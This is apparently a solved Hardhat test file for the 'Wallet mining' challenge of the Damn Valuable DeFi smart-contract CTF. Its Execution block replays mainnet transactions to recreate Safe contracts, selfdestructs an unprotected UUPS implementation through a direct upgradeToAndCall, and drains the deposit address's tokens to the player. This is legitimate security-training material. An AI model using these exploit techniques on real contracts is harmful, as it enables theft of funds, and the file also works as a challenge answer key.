const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {

        // there are two vulns
        // firstly, contracts mentioned in the challenge formulation exist on the mainnet
        // and we can recreate them using a replay attack
        // secondly, AuthorizerUpgradeable has an alternative implementation of upgradeToAndCall
        // without onlyProxy modifier
        // so it can be called on the implementation directly => we can destroy it
        // the highly optimized can function in WalletDeployer will just return true after this
        // then we will create enough wallets until we stuble upon 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
        // and also get all the prizes for the wallets creation

        // keccak256("eip1967.proxy.implementation") - 1
        // storage slot where an eip1967 proxy keeps the implementation address
        const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";

        // address of the safe deployer on the mainnet
        // it deployed the real contracts from this challenge
        const SAFE_DEPLOYER = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";

        const PROXY_FACTORY = "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b";
        const MASTER_COPY = "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F";

        /** SET RPC URL HERE */
        const MAINNET_URL = "<enter your RPC URL here>";
        const mainnetProvider = new ethers.providers.JsonRpcProvider(MAINNET_URL);

        const transactions = [
            // deploying master copy at MASTER_COPY
            await mainnetProvider.getTransaction("0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3"),
            // setting implementation
            await mainnetProvider.getTransaction("0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4"),
            // creating proxy factory at PROXY_FACTORY
            await mainnetProvider.getTransaction("0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261")
        ];

        // splitting transaction into unsigned part and signature
        // to use in ethers.utils.serializeTransaction
        const txToUnsignedAndSignature = (tx) => {
            unsignedProperties = ["to", "nonce", "gasLimit", "gasPrice", "data", "value", "chainId"];
            signatureProperties = ["v", "r", "s"];
            getPair = (key => [key, tx[key]]);
            unsignedTx = Object.fromEntries(unsignedProperties.map(getPair));
            signature = Object.fromEntries(signatureProperties.map(getPair));
            return [unsignedTx, signature];
        }

        rawTransactions = transactions.map(txToUnsignedAndSignature).map(
            tup => ethers.utils.serializeTransaction(...tup)
        );
        await player.sendTransaction({
            to: SAFE_DEPLOYER, 
            value: 10n**17n
        });
        await rawTransactions.map(ethers.provider.sendTransaction);

        proxyFactory = await ethers.getContractAt(
            "GnosisSafeProxyFactory", 
            PROXY_FACTORY, 
            player
        );
        masterCopy = await ethers.getContractAt(
            "GnosisSafe", 
            MASTER_COPY, 
            player
        );

        implementationSlotValue = await ethers.provider.getStorageAt(
            authorizer.address, 
            IMPLEMENTATION_SLOT
        );
        implementationAddress = ethers.utils.getAddress(
            "0x" + implementationSlotValue.slice(-40).toString("hex")
        );
        authorizerImplmentation = await ethers.getContractAt(
            "AuthorizerUpgradeable", 
            implementationAddress 
        );
        badAuthorizer = await (await ethers.getContractFactory('BadAuthorizerUpgradeable', player)).deploy();
        selfDestructCallData = badAuthorizer.interface.encodeFunctionData(
            "selfDestruct", 
            [player.address]
        ); 
        await authorizerImplmentation.init([], []);
        await authorizerImplmentation.upgradeToAndCall(badAuthorizer.address, selfDestructCallData);

        attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy(
            walletDeployer.address
        );

        await attacker.attack();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
